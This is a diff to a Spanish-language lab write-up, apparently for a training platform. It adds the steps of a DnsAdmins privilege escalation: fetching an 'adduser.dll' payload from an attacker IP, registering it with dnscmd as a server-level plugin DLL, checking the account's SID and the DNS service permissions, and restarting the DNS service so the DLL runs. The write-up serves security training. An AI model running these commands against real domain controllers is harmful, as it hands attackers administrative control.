@@ -393,7 +393,11 @@ xfreerdp3 /v:10.129.43.42 /u:netadm
 ```
 <img width="1057" height="823" alt="image" src="https://github.com/user-attachments/assets/45a7d78c-976b-4d68-8387-a9151291cebf" />
 
-Abrimos una `powershell` y verificamos que pertenecemos al grupo `DnsAdmins` 
+Abrimos una `powershell` e intentamos abrir el archivo especificado:
+<img width="940" height="238" alt="image" src="https://github.com/user-attachments/assets/733ed938-155e-4965-90b9-14715e8579e5" />
+
+
+Verificamos que pertenecemos al grupo `DnsAdmins` 
 ```powershell
 Get-ADGroupMember -Identity DnsAdmins
 ```
@@ -421,6 +425,41 @@ wget "http://10.10.14.27:7777/adduser.dll" -outfile "adduser.dll"
 ```
 
 <img width="761" height="396" alt="image" src="https://github.com/user-attachments/assets/48040e95-1b95-4ead-b338-11c5d9b7f219" />
+Cargamos la dll con el siguiente comando:
+```powershel
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+```
+<img width="756" height="94" alt="image" src="https://github.com/user-attachments/assets/c25fa8ef-bdb7-47b0-b513-d3b9278acf47" />
+
+Para que estos cambios tengan efecto, el servicio dns debe reiniciarse. Procedemos a verificar si tenemos los permisos para reiniciar el servicio.
+
+Obtenemos nuestro sid
+```powershell
+wmic useraccount where name="netadm" get sid
+```
+Este comando no funciona por lo que lo modificamos:
+```powershell
+wmic useraccount where "name='netadm'" get sid
+```
+<img width="693" height="144" alt="image" src="https://github.com/user-attachments/assets/7ac8dd55-ecc8-4e6b-af53-4437256a1a34" />
+Ahora que tenemos nuestro SID, procedemos a mostrar el descriptor de seguridad de DNS:
+
+```powershell
+sc.exe sdshow DNS
+```
+<img width="1016" height="268" alt="image" src="https://github.com/user-attachments/assets/e3d57f00-6769-41cb-a62f-42b6caf1f813" />
+Observamos que `RPWP` esta vinculado a nuestro `SID`, que se traduce a `SERVICE_START` y `SERVICE_STOP`
+
+Esto quiere decir que tenemos permisos suficiente para reiniciar el servicio `DNS`.
+Pausamos el servicio nuevamente:
+```cmd
+sc stop dns
+```
+A continuación arrancamos de nuevo el servicio
+```cmd
+sc start dns
+```
+
 
 
 
